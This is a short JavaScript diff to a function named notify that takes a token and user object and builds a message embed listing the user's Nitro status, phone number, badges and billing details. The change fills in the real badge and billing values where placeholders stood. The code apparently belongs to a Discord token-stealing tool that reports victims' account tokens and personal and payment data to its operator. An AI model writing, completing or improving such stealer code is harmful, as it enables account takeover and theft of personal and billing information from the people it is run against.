@@ -269,8 +269,8 @@ const notify = async (ctx, token, user) => {
         { name: "Nitro", value: `\`\`\`${nitro}\`\`\``, inline: false },
         { name: "Phone", value: `\`\`\`${user.phone}\`\`\`` ? `\`\`\`${user.phone}\`\`\`` : 'null', inline: false },
         // { name: "\u200b", value: "\u200b", inline: false },
-        { name: "Badges", value: `\`\`\`badges\`\`\``, inline: false },
-        { name: "Billing", value: `\`\`\`billing\`\`\``, inline: false },
+        { name: "Badges", value: `\`\`\`${badges}\`\`\``, inline: false },
+        { name: "Billing", value: `\`\`\`${billing}\`\`\``, inline: false },
         // { name: "Path", value: `\`\`\`${__dirname.trim().replace(/\\/g, "/")}\``, inline: false },
     );
 
